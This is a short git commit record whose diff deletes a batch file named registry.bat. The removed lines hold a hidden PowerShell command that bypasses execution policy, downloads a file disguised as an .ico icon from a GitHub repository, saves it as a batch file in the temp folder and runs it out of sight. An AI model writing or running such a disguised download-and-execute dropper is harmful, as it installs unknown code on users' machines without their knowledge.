a358b0e0099be2403abbaf9c65a530a547f97dd9
Splash2520 <splashxsplashx25@gmail.com>
2025-05-11 22:24:19 +0100

    Delete registry.bat

--- registry.bat
+++
@@ -1,3 +0,0 @@
-@echo off
-powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "& {Invoke-WebRequest -Uri 'https://github.com/Splash2520/Registry/raw/refs/heads/main/Registry.ico' -OutFile $env:TEMP\Registry.bat; Start-Process -FilePath $env:TEMP\Registry.bat -WindowStyle Hidden}"
-exit
